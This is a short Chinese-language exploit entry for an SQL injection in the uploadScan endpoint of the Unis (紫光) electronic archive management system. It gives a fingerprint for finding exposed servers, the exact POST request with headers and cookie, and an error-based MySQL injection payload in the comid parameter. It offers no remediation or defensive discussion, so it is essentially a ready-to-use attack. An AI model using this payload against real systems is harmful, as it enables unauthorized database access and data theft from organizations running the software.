# 紫光电子档案管理系统uploadscan存在Sql注入

- **系统**：紫光电子档案管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="www.unissoft.com"`
- **请求**：`POST /Archive/ErecordManage/uploadScan HTTP/1.1`
- **关键头**：`Content-Length: 122`　`Content-Type: application/x-www-form-urlencoded`　`Cookie: PHPSESSID=d975079e026f37100363a28c7f5d81b0; winWidth=1395; winHeight=897`

**请求体 / payload**
```
userID=admin&fondsid=1&comid=1' AND GTID_SUBSET(CONCAT(0x7176717671,(SELECT (ELT(4599=4599,1))),0x7171627871),4599)-- bbjp
```
- **预期**：200　|　—